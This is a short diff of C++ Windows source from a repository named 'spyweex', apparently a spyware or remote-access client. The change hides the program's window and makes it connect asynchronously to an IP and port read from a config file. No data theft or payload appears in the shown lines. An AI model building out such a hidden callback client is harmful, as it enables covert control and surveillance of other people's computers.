@@ -58,10 +58,10 @@ static std::map<int, std::wstring> cor =
 };
 #pragma endregion
 
+http::server::server s;
+
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
-	char *locale;
-	locale = setlocale(LC_ALL, "");
 	nCmdShow = 0;
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(lpCmdLine);
@@ -80,7 +80,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 
 	std::ifstream cfgFile("C:\\Users\\weex9_000\\Source\\Repos\\spyweex-repo\\Debug\\cfgspx.txt", std::ifstream::in);
 	std::string target_address;
-	//std::getline(cfgFile, target_address);
 
 	if(cfgFile.is_open())
 	{
@@ -91,7 +90,11 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 	std::string ip = ip_port[0];
 	std::string port = ip_port[1];
 
-	http::server::server s(ip, port);
+
+	s.set_ip(ip);
+	s.set_port(port);
+	s.async_connect();
+
 	//boost::thread t(boost::bind(&http::server::server::run, &s));
 	boost::thread_group worker_threads;
 	for (int i = 0; i < 5; i++)
